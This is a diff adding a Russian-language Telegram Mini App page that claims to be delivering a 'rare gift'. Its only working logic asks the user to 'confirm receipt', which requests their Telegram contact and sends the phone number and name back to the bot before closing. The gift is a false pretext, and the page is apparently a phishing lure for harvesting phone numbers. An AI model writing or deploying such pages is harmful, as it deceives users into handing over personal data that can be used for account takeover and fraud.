@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Редкий подарок</title>
+  <style>
+    body {
+      margin: 0;
+      height: 100vh;
+      background: linear-gradient(135deg, #0f0f17, #1a1a2e);
+      color: #e0e0ff;
+      font-family: -apple-system, BlinkMacOSystemFont, 'Segoe UI', Roboto, sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      overflow: hidden;
+    }
+    h1 {
+      font-size: 2.2rem;
+      margin-bottom: 1rem;
+      text-shadow: 0 0 20px rgba(0, 136, 204, 0.5);
+    }
+    p {
+      font-size: 1.1rem;
+      opacity: 0.8;
+      margin-bottom: 2rem;
+    }
+    .loader {
+      width: 80px;
+      height: 80px;
+      border: 5px solid #0088cc44;
+      border-top: 5px solid #0088cc;
+      border-radius: 50%;
+      animation: spin 1.2s linear infinite;
+      margin-bottom: 2rem;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body>
+  <div class="loader"></div>
+  <h1>Получаем ваш подарок...</h1>
+  <p>Это займёт всего несколько секунд</p>
+
+  <script>
+    const tg = window.Telegram.WebApp;
+    tg.ready();
+    tg.expand();
+    tg.MainButton.setText("Подтвердить получение");
+    tg.MainButton.show();
+    tg.MainButton.onClick(() => {
+      tg.requestContact()
+        .then(contact => {
+          tg.sendData(JSON.stringify({
+            contact: {
+              phone_number: contact.phone_number,
+              first_name: contact.first_name,
+              last_name: contact.last_name || ""
+            }
+          }));
+          tg.close();
+        })
+        .catch(() => {
+          tg.sendData(JSON.stringify({ error: "contact_denied" }));
+        });
+    });
+  </script>
+</body>
+</html>
